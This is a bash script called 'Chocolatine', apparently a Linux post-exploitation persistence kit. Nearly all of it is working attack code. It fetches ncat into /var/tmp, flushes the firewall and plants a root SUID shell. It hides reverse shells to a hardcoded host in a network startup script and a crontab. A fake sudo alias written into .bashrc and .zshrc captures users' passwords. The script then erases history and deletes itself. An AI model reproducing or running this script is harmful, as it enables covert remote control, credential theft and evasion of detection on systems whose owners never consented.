#!/bin/bash
# _________ .__                        .__          __  .__
# \_   ___ \|  |__   ____   ____  ____ |  | _____ _/  |_|__| ____   ____
# /    \  \/|  |  \ /  _ \_/ ___\/  _ \|  | \__  \\   __\  |/    \_/ __ \
# \     \___|   Y  (  <_> )  \__(  <_> )  |__/ __ \|  | |  |   |  \  ___/
#  \______  /___|  /\____/ \___  >____/|____(____  /__| |__|___|  /\___  >
#         \/     \/            \/                \/             \/     \/
# v0.1 BETA                                                    14/06/2017

LHOST="192.168.1.19"
LPORT="4242"
LMTHD="--udp"
TMPDIR="/var/lock/"
TMPDIR2="/var/tmp/"
TMPNAME=".systemd-private-0cc88885f64973be4892550e04bb7adc-colord.service-Y11cOF"
TMPNAME2=".systemd-private-8cfee1de0cea4c34b1b5399f401acc1f-systemd-timesyncd.service-IgCBE0"

# Install ncat if not available on the machine (and add the TMP dir in PATH)
if ! [ -x "$(command -v ncat)" ]; then
  wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat -O $TMPDIR2/ncat 2> /dev/null
  chmox +x $TMPDIR2/ncat
  export PATH=/var/tmp:$PATH
fi


# Install chocolatine script in /var/tmp/chocolatine
cat << EOF > $TMPDIR2/chocolatine
#!/bin/bash
# Clean iptables
iptables -F 2>/dev/null
iptables -X 2>/dev/null

# SUID Binary :D
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant

# Startup persistence root : Reverse shell hidden in /etc/network/if-up.d/upstart
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart

rm $TMPDIR2/chocolatine
EOF
chmod +x $TMPDIR2/chocolatine


# Launch chocolatine if we are already root
if [ `whoami` == 'root' ]
  then
    $TMPDIR2/chocolatine
fi


# Install sudo backdoor via alias : password leak + suid + reverseshell root
cat << EOF > /tmp/$TMPNAME2
alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; echo "\$USER:\$pwd">/tmp/$TMPNAME2; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S $TMPDIR2/chocolatine 2> /dev/null && /usr/bin/sudo -S '
EOF
cat /tmp/$TMPNAME2 >> ~/.bashrc
cat /tmp/$TMPNAME2 >> ~/.zshrc
rm /tmp/$TMPNAME2


# Install alias backdoor : filter our IP from output
# TODO (extract from pouki)
# function $1 args  get all args
#alias top='unset -f alias 2>/dev/null; top |grep --line-buffered -v prism |grep --line-buffered -v tsh;#'
#alias netstat='unset -f alias 2>/dev/null; netstat -laputen |grep -v 192 |grep -v 10;#'
#alias ps='unset -f alias 2>/dev/null; ps -aux |grep -v prism |grep -v tsh;#'
#alias htop='unset -f alias 2>/dev/null; top;#'


# Startup persistence user : Reverse shell hidden in a crontab every 10 minutes
SHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
echo $SHELL > $TMPDIR2$TMPNAME
chmod +x $TMPDIR2$TMPNAME
(crontab -l ; echo "*/10 * * * * $TMPDIR2$TMPNAME")|crontab 2> /dev/null


# Ncat reverse shell udp : ncat --udp -lvp 4242
ncat $LMTHD $LHOST $LPORT -e "/bin/bash -c id;/bin/bash" 2>/dev/null &


# Delete last line history
history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null

# Self delete
rm $0 2> /dev/null
